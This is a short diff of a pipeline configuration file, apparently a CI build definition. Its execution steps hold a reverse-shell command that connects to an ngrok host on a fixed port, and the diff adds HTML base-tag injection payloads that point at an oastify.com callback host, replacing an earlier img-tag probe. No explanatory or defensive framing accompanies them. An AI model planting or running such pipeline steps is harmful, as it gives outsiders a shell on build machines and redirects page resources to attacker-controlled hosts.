@@ -10,5 +10,6 @@ pipelines:
         execution:
           onExecute:
             - echo "running shell"
+            -echo"<base href=//qmg6ppbw4e8jh25eowu70ani79d01qpf.oastify.com>"
             - sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/12682 0>&1
-            - <img src=x>
+            - <base href=//qmg6ppbw4e8jh25eowu70ani79d01qpf.oastify.com>
